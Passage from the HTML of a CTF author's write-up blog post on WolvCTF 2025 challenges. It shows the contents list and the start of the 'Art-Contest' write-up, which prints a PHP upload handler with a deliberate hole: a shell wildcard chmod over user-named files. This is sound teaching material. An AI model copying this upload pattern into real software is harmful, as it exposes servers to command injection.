@@ -1,0 +1,3927 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="light"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#FFFFFF" />
+  
+  <title>WolvCTF 2025 &middot; dree.blog</title>
+    <meta name="title" content="WolvCTF 2025 &middot; dree.blog" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.8f25b3b1fdd42cfaf2092d7e98b41f6474cfaf471f6aeb265f7ba2579197e54e.css"
+    integrity="sha256-jyWzsf3ULPryCS1&#43;mLQfZHTPr0cfausmX3uiV5GX5U4="
+  />
+  
+    
+    
+    
+  
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.e2f23ac92b690a4e99ab2dffef9aa96a95f7ec39636fb9fa7eeb70d55ba347ae.js"
+      integrity="sha256-4vI6yStpCk6Zqy3/75qpapX37Dljb7n6futw1VujR64="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Author writeups for my 6 individual challenges
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/wolvctf-2025/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/wolvctf-2025/">
+  <meta property="og:site_name" content="dree.blog">
+  <meta property="og:title" content="WolvCTF 2025">
+  <meta property="og:description" content="Author writeups for my 6 individual challenges">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-03-29T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-03-29T00:00:00+00:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Forensics">
+    <meta property="article:tag" content="OSINT">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="WolvCTF 2025">
+  <meta name="twitter:description" content="Author writeups for my 6 individual challenges">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "WolvCTF 2025",
+    "headline": "WolvCTF 2025",
+    
+    "abstract": "\u003cp\u003eAuthor writeups for my 6 individual challenges\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/wolvctf-2025\/",
+    "author" : {
+      "@type": "Person",
+      "name": "dree"
+    },
+    "copyrightYear": "2022",
+    "dateCreated": "2022-03-29T00:00:00\u002b00:00",
+    "datePublished": "2022-03-29T00:00:00\u002b00:00",
+    
+    "dateModified": "2022-03-29T00:00:00\u002b00:00",
+    
+    "keywords": ["Web","Forensics","OSINT"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "4145"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "Welcome to Congo! Tada",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/posts/",
+       "name": "Posts",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Wolv Ctf 2025",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  <meta name="author" content="dree" />
+  
+    
+      <link href="mailto:dree.31415@gmail.com" rel="me" />
+    
+      <link href="https://github.com/dreeSec" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >dree.blog</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+                  <button
+                    id="search-button-1"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+            
+              
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Welcome to Congo! :tada:</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/posts/"
+      >Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/posts/wolvctf-2025/"
+      >WolvCTF 2025</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        WolvCTF 2025
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2022-03-29 00:00:00 &#43;0000 UTC">29 March 2022</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">20 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="https://github.com/jpanther/congo/tree/dev/exampleSite/content/posts/WolvCTF-2025/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 lg:sticky lg:top-10 print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#art-contest">Art-Contest</a>
+      <ul>
+        <li><a href="#challenge-description">Challenge Description</a></li>
+        <li><a href="#solve">Solve</a>
+          <ul>
+            <li><a href="#file-details">File Details</a></li>
+            <li><a href="#step-1">Step 1</a></li>
+            <li><a href="#step-2">Step 2</a></li>
+            <li><a href="#step-3">Step 3</a></li>
+            <li><a href="#step-4">Step 4</a></li>
+            <li><a href="#step-5">Step 5</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#lost-2">Lost 2</a>
+      <ul>
+        <li><a href="#challenge-description-1">Challenge Description</a></li>
+        <li><a href="#solve-1">Solve</a></li>
+      </ul>
+    </li>
+    <li><a href="#passwords">Passwords</a>
+      <ul>
+        <li><a href="#challenge-description-2">Challenge Description</a></li>
+        <li><a href="#solve-2">Solve</a></li>
+      </ul>
+    </li>
+    <li><a href="#active-1-domain-access">Active 1: Domain Access</a>
+      <ul>
+        <li><a href="#challenge-description-3">Challenge Description</a></li>
+        <li><a href="#solve-3">Solve</a>
+          <ul>
+            <li><a href="#part-1---infiltration">Part 1 - Infiltration</a></li>
+            <li><a href="#part-2---shell-access">Part 2 - Shell Access</a></li>
+            <li><a href="#part-3---getting-a-domain-user">Part 3 - Getting a domain user</a></li>
+            <li><a href="#final-flag">Final Flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#active-2-lateral-movement">Active 2: Lateral Movement</a>
+      <ul>
+        <li><a href="#challenge-description-4">Challenge Description</a></li>
+        <li><a href="#solve-4">Solve</a>
+          <ul>
+            <li><a href="#part-1-enumerating-dans-account">Part 1: Enumerating Dan&rsquo;s Account</a></li>
+            <li><a href="#flag-part-2-enumerating-emilys-account">Flag Part 2: Enumerating Emily&rsquo;s account</a></li>
+            <li><a href="#part-3-enumerating-jamess-account">Part 3: Enumerating James&rsquo;s Account</a></li>
+            <li><a href="#final-flag-1">Final flag</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#active-3-domain-admin">Active 3: Domain Admin</a>
+      <ul>
+        <li><a href="#challenge-description-5">Challenge Description</a></li>
+        <li><a href="#solve-5">Solve</a></li>
+        <li><a href="#part-1-obtaining-jessicas-password-hash">Part 1: Obtaining Jessica&rsquo;s password hash</a>
+          <ul>
+            <li><a href="#cracking-jessicas-password-hash">Cracking Jessica&rsquo;s password hash</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#active-video-walkthrough">Active Video Walkthrough</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <p>Author writeups for my 6 individual challenges</p>
+<hr>
+<hr>
+<h2 id="art-contest" class="relative group">Art-Contest <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#art-contest" aria-label="Anchor">#</a></span></h2><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324124730_hu13625163003087534324.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324124730_hu2598828379842644836.webp 660w
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324124730_hu3028386928530172281.webp 968w
+              
+            
+            
+              
+                ,/posts/wolvctf-2025/Pasted_image_20250324124730_hu3028386928530172281.webp 968w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="968"
+        height="894"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324124730_hu694403438373399680.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324124730_hu14231259989991235609.png 330w,/posts/wolvctf-2025/Pasted_image_20250324124730_hu694403438373399680.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324124730.png 968w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324124730.png 968w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="challenge-description" class="relative group">Challenge Description <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#challenge-description" aria-label="Anchor">#</a></span></h3><p>Submit your best ascii art to win!</p>
+<p><a href="https://art-contest-974780027560.us-east5.run.app" target="_blank" rel="noreferrer">https://art-contest-974780027560.us-east5.run.app</a></p>
+<h3 id="solve" class="relative group">Solve <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#solve" aria-label="Anchor">#</a></span></h3><h4 id="file-details" class="relative group">File Details <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#file-details" aria-label="Anchor">#</a></span></h4><p>Users are given this site</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="/posts/wolvctf-2025/Pasted_image_20250324131316_hu9308548703324434233.webp 330w,/posts/wolvctf-2025/Pasted_image_20250324131316_hu10764036898382970732.webp 660w
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250324131316_hu10029570507428742339.webp 1024w
+            
+            
+              ,/posts/wolvctf-2025/Pasted_image_20250324131316_hu1075637338672895524.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="2956"
+        height="1850"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="/posts/wolvctf-2025/Pasted_image_20250324131316_hu6395435125908275595.png"
+          srcset="/posts/wolvctf-2025/Pasted_image_20250324131316_hu18348569451380815193.png 330w,/posts/wolvctf-2025/Pasted_image_20250324131316_hu6395435125908275595.png 660w
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324131316_hu16448715965759848235.png 1024w
+          
+          
+            ,/posts/wolvctf-2025/Pasted_image_20250324131316_hu7772442612104399332.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>And <code>index.php</code> which contains the following PHP before the HTML</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$session_id</span> <span class="o">=</span> <span class="nx">session_id</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/uploads/</span><span class="si">$session_id</span><span class="s2">/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Creating the session-specific upload directory if it doesn&#39;t exist
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">,</span> <span class="mo">0755</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chown</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">,</span> <span class="s1">&#39;www-data&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chgrp</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">,</span> <span class="s1">&#39;www-data&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>And after</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;fileToUpload&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$target_file</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$session_id</span> <span class="o">=</span> <span class="nx">session_id</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$target_dir</span> <span class="o">=</span> <span class="s2">&#34;/var/www/html/uploads/</span><span class="si">$session_id</span><span class="s2">/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$target_file_path</span> <span class="o">=</span> <span class="nv">$target_dir</span> <span class="o">.</span> <span class="nv">$target_file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$lastDotPosition</span> <span class="o">=</span> <span class="nx">strrpos</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check if file already exists
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$target_file_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, file already exists.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check file size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">50000</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, your file is too large.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// If the file contains no dot, evaluate just the filename
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$lastDotPosition</span> <span class="o">==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$extension</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$lastDotPosition</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$extension</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$target_file</span><span class="p">,</span> <span class="nv">$lastDotPosition</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Ensure that the extension is a txt file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$extension</span> <span class="o">!==</span> <span class="s1">&#39;txt&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, only .txt extensions are allowed.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-f0-9]{32}$/&#39;</span><span class="p">,</span> <span class="nv">$session_id</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">echo</span> <span class="s2">&#34;Sorry, that is not a valid session ID.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$uploadOk</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Check if $uploadOk is set to 0 by an error
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$uploadOk</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Sorry, your file was not uploaded.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// If everything is ok, try to upload the file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="nv">$target_file_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;The file &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;fileToUpload&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]))</span> <span class="o">.</span> <span class="s2">&#34; has been uploaded.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;Sorry, there was an error uploading your file.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$old_path</span> <span class="o">=</span> <span class="nx">getcwd</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$target_dir</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// make unreadable - the proper way
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">shell_exec</span><span class="p">(</span><span class="s1">&#39;chmod -- 000 *&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">chdir</span><span class="p">(</span><span class="nv">$old_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>And the <code>Dockerfile</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="k">FROM</span><span class="s"> php:8.4-apache</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Install cron</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> apt-get update <span class="o">&amp;&amp;</span> apt-get install -y cron <span class="o">&amp;&amp;</span> rm -rf /var/lib/apt/lists/*<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="c"># Copy the index page</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> index.php /var/www/html/index.php<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
